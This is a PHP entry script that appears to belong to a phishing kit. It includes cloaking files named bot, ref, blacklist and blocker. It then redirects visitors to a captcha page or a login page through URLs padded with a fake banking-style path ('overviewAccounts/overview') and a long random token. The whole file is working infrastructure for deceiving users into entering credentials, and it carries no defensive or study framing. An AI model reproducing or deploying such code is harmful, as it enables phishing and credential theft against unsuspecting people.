<?php
include './prevents/bot.php';
include './prevents/ref.php';
include './prevents/blacklist.php';
include './prevents/blocker.php';
//set 1 or true to open captcha.php and set 0 to open login page
check_captcha(1);


function genRandString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

/* This function redirects to captcha.php if use_captcha is True, 
otherwise it redirects to login page */

$_SESSION['randString']     = genRandString(80);


function check_captcha($use_captcha)
{
    if ($use_captcha === true || $use_captcha === 1) {
        $destination = "web/captcha.php?web/mun/wf23#/now/overviewAccounts/overview/index={$_SESSION['randString']}";
    } else {
        $destination = "web/login.php?web/mun/wf24#/now/overviewAccounts/overview/index={$_SESSION['randString']}";
    }
    header("Location: $destination");
    exit;
}
